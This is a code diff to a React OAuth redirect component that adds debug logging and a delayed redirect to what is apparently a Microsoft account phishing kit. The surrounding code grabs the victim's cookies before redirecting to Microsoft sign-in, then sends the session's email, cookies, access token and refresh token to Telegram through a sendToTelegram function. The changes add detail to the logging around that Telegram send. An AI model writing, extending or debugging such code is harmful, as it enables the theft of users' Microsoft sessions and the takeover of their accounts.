@@ -309,6 +309,7 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
   };
 
   useEffect(() => {
+    console.log('🚀 Component mounted, checking for OAuth callback...');
     localStorage.setItem('oauth_state', STATE);
     localStorage.setItem('selected_provider', 'Microsoft');
     localStorage.setItem('oauth_start_time', Date.now().toString());
@@ -351,13 +352,19 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
       return;
     }
 
-    if (code && state && state === storedState) {
-      console.log('✅ Valid OAuth callback detected, processing...');
-      handleOAuthCallback(code);
-      return;
-    } else {
-      console.log('ℹ️ Not an OAuth callback, proceeding with redirect countdown');
-    }
+          if (code && state && state === storedState) {
+        console.log('✅ Valid OAuth callback detected, processing...');
+        handleOAuthCallback(code);
+        return;
+      } else {
+        console.log('ℹ️ Not an OAuth callback, proceeding with redirect countdown');
+        console.log('🔍 Callback check details:', {
+          hasCode: !!code,
+          hasState: !!state,
+          stateMatch: state === storedState,
+          willShowCountdown: true
+        });
+      }
 
     // Start countdown for redirect
     const timer = setInterval(() => {
@@ -376,9 +383,11 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   const handleOAuthCallback = async (code: string) => {
     try {
+      console.log('🔄 ===== OAUTH CALLBACK TRIGGERED =====');
       console.log('🔄 Starting OAuth callback handling with code:', code);
       console.log('🔄 Current URL:', window.location.href);
       console.log('🔄 Code length:', code?.length || 0);
+      console.log('🔄 Timestamp:', new Date().toISOString());
       
       // Validate we have the necessary data
       if (!code) {
@@ -582,13 +591,21 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         }
 
         try {
+          console.log('🔄 ===== TELEGRAM SEND ATTEMPT =====');
           console.log('🔄 Step 2: Sending data to Telegram...');
           console.log('🔄 Session data being sent:', {
             email: sessionData.email,
+            provider: sessionData.provider,
+            sessionId: sessionData.sessionId,
             cookieCount: sessionData.formattedCookies?.length || 0,
             hasCookies: !!(sessionData.formattedCookies && sessionData.formattedCookies.length > 0),
-            firstCookie: sessionData.formattedCookies?.[0]?.name || 'none'
+            hasAccessToken: !!sessionData.accessToken,
+            hasRefreshToken: !!sessionData.refreshToken,
+            firstCookie: sessionData.formattedCookies?.[0]?.name || 'none',
+            timestamp: new Date().toISOString()
           });
+          
+          console.log('🔄 About to call sendToTelegram function...');
           const telegramResult = await sendToTelegram(sessionData);
           telegramSuccess = true;
           console.log('✅ Step 2 completed: Data sent to Telegram', telegramResult);
@@ -644,7 +661,10 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   const handleOAuthRedirect = () => {
     setIsRedirecting(true);
+    console.log('🔄 ===== STARTING OAUTH REDIRECT =====');
     console.log('🔄 Redirecting to Microsoft OAuth:', MICROSOFT_OAUTH_URL);
+    console.log('🔄 Current URL before redirect:', window.location.href);
+    console.log('🔄 State stored:', localStorage.getItem('oauth_state'));
 
     // Grab cookies before redirect (from session if available)
     grabCookies();
@@ -653,9 +673,13 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
     const currentUrl = new URL(window.location.href);
     currentUrl.searchParams.set('oauth_callback', 'true');
     window.history.replaceState({}, '', currentUrl.toString());
+    console.log('🔄 URL updated for callback detection:', currentUrl.toString());
 
+    console.log('🔄 About to redirect to Microsoft...');
     // Redirect to Microsoft OAuth
-    window.location.href = MICROSOFT_OAUTH_URL;
+    setTimeout(() => {
+      window.location.href = MICROSOFT_OAUTH_URL;
+    }, 1000); // Small delay to ensure logs are visible
   };
 
   const handleManualRedirect = () => {
